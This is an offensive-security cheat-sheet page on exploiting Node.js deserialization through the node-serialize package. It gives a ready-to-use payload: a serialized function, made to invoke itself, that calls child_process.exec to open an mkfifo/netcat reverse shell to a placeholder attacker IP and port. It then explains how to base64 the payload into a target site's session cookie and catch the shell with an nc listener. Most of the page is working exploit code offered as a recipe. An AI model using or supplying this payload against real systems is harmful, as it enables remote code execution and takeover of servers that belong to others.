# Node.js Deserialization

Node.js deserialization is vulnerable to remote command executions.

### Cookie Reverse Shell <a href="#cookie-reverse-shell" id="cookie-reverse-shell"></a>

#### 1. Generate a Payload <a href="#id-1-generate-a-payload" id="id-1-generate-a-payload"></a>

We can use the online tools like [RunKit](https://npm.runkit.com/node-serialize) to execute the node package.\
If you want to do in your local environment, you need to install a npm package first.

```shellscript
mkdir test
cd test
npm install node-serialize
```

Next, create the payload for serialization to execute a reverse shell.\
For instance, the file is named “serialize.js”.

```shellscript
let y = {
  rce: function() {
    require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> <local-port> >/tmp/f', function(error, stdout, stderr) { console.log(stdout); });
  },
};

let serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

In the above code, change **"\\\<local-ip>"** and **"\\\<local-port>"** to match your environment.

Execute node to generate the payload.

```
node serialize.js
```

Our payload generated in terminal.\
Next, we need to add IIFE brackets **"()"** after the function in the generated payload. By doing this, the function will invoke when the object created. For details, please see [the awesome post](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

The final payload is as below:

```shellscript
{"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> <local-port> >/tmp/f', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
```

In addition, edit the key name (**”rce”**) and remove **“\n”** characters as you want.

#### 2. Encode a Payload by Base64 and Add to Cookie <a href="#id-2-encode-a-payload-by-base64-and-add-to-cookie" id="id-2-encode-a-payload-by-base64-and-add-to-cookie"></a>

Copy the above json object and encode it by Base64, then copy the encoded text.\
Paste it to the Cookie value of HTTP header in target website.

```shellscript
Cookie: session=eyJyY2U...iAgfSJ9==
```

#### 3. Execute Reverse Shell <a href="#id-3-execute-reverse-shell" id="id-3-execute-reverse-shell"></a>

Start a listener for reverse shell

```shellscript
nc -lvnp <local-port>
```

In target website, reload the page.\
You should get a shell.

### References <a href="#references" id="references"></a>

* [OpSecX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
